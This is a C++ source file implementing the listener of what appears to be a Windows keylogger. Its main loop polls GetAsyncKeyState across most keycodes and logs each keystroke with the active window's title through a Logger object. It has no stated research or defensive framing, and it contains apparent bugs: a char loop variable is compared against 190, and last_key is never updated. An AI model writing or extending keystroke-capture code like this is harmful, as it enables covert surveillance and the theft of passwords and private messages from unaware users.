#include "pch.h"
#include "Listener.h"

// Listener(Logger*) : Class cunstructor
Listener::Listener(Logger* logger)
{
	this->Log = logger;
	this->Listening = false;
}

// Start() : Start listening
void Listener::Start()
{
	this->Listening = true;
	this->Run();
}

// Stop() : Stop listening
void Listener::Stop()
{
	this->Listening = false;
}

// IsListening() : Return Listener status (Listening attribut)
bool Listener::IsListening() const
{
	return Listening;
}

// Run() : Listener main loop
void Listener::Run()
{
	// Instantiate needed variables
	char key;
	char last_key = '8'; 

	// Restart Listner timer 
	this->Timer.restart();

	while (this->IsListening())
	{
		for (key = 8; key <= 190; ++key)
		{
			if (GetAsyncKeyState(key) == -32767) // save keyboard entree
			{
				if (key == last_key && this->Timer.getElapsedTime() <= milliseconds(200))
				{
				}
				else
				{
					Log->Add(Utilities::GetActiveWindow(), key);
					this->Timer.restart();
				}
			}

		}

		// Ease CPU
		Sleep(100);
	}

}

